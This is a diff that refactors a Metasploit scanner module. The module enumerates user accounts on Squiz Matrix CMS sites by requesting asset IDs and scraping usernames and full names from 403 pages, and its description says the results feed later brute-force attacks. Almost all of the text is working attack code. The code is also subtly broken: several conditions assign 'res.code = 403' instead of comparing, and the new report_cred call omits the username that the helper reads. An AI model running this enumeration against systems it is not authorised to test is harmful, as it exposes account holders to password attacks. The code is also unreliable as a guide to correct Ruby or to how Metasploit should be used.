@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::HttpClient
@@ -22,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Squiz Matrix User Enumeration Scanner',
       'Description'    => %q{
-        This module attempts to enumernate remote users that exist within
+        This module attempts to enumerate remote users that exist within
         the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs
         e.g. ?a=14 and searching for a valid username eg "~root" or "~test" which
         is prefixed by a "~" in the response. It will also try to GET the users
@@ -30,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
         ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.
         Information gathered may be used for later bruteforce attacks.
       },
-      'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'patrick' ],
+      'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'aushack' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
@@ -40,15 +38,10 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [true, 'The path to users Squiz Matrix installation', '/']),
+        OptString.new('TARGETURI', [true, 'The path to users Squiz Matrix installation', '/']),
         OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1]),
         OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100]),
-      ], self.class)
-  end
-
-  def target_url
-    uri = normalize_uri(datastore['URI'])
-    "http://#{vhost}:#{rport}#{uri}"
+      ])
   end
 
   def run_host(ip)
@@ -65,9 +58,9 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if(@users_found.empty?)
-      print_status("#{target_url} - No users found.")
+      print_status("#{full_uri} - No users found.")
     else
-      print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
+      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
       report_note(
       :host => rhost,
       :port => rport,
@@ -80,18 +73,44 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def do_enum(asset)
     begin
+      uri = normalize_uri(target_uri.path)
+
       res = send_request_cgi({
-        'uri'     =>  "#{target_url}?a=#{asset}",
+        'uri'     =>  "#{uri}?a=#{asset}",
         'method'  => 'GET'
       }, 20)
 
       if (datastore['VERBOSE'])
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
-          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
+          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
         else
-          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}'")
+          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}'")
         end
       end
 
@@ -99,34 +118,34 @@ class Metasploit3 < Msf::Auxiliary
         user=$1.strip
 
         # try the full name of the user
-        tmpasset = asset -1
+        tmpasset = asset - 1
         res = send_request_cgi({
-          'uri'     =>  "#{target_url}?a=#{tmpasset}",
+          'uri'     =>  "#{uri}?a=#{tmpasset}",
           'method'  => 'GET'
         }, 20)
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
-          tmpasset = asset -2
+          tmpasset = asset - 2
           res = send_request_cgi({
-            'uri'     =>  "#{target_url}?a=#{tmpasset}",
+            'uri'     =>  "#{uri}?a=#{tmpasset}",
             'method'  => 'GET'
           }, 20)
-          print_good("#{target_url}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
+          print_good("#{full_uri}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
           if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
             fullname = $1.strip
-            print_good("#{target_url}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
+            print_good("#{full_uri}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
             @users_found["#{user} (#{fullname})"] = :reported
           end
         else
-          print_good("#{target_url} - Squiz Matrix User: '#{user}'")
+          print_good("#{full_uri} - Squiz Matrix User: '#{user}'")
           @users_found[user] = :reported
         end
 
-        report_auth_info(
-        :host => rhost,
-        :sname => (ssl ? 'https' : 'http'),
-        :user => user,
-        :port => rport,
-        :proof => "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}")
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: (ssl ? 'https' : 'http'),
+          proof: "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}"
+        )
       end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
